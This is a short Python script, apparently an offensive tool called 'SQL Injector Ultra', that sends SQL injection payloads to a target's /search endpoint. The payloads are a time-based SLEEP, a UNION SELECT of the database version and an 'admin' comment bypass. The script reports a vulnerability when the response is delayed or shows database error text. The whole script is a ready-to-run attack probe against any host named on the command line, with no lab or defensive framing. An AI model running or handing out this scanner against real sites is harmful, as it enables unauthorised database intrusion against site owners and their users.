import sys
import requests

def sql_inject(target):
    print(f"[!] Target {target}: Deploying SQL Injector Ultra...")
    # Time-based & Error-based payloads
    payloads = ["' OR SLEEP(5)--", "' UNION SELECT NULL,@@version--", "admin' --"]
    
    for p in payloads:
        try:
            url = f"http://{target}/search?q={p}"
            start = __import__('time').time()
            r = requests.get(url, timeout=10)
            if (__import__('time').time() - start) > 4:
                return f"VULNERABILITY CONFIRMED: Time-based SQLi via {p}"
            if "error" in r.text.lower() or "mysql" in r.text.lower():
                return f"VULNERABILITY CONFIRMED: Error-based SQLi via {p}"
        except: continue
    return "No SQL Injection points identified."

if __name__ == "__main__":
    if len(sys.argv) > 1: print(sql_inject(sys.argv[1]))
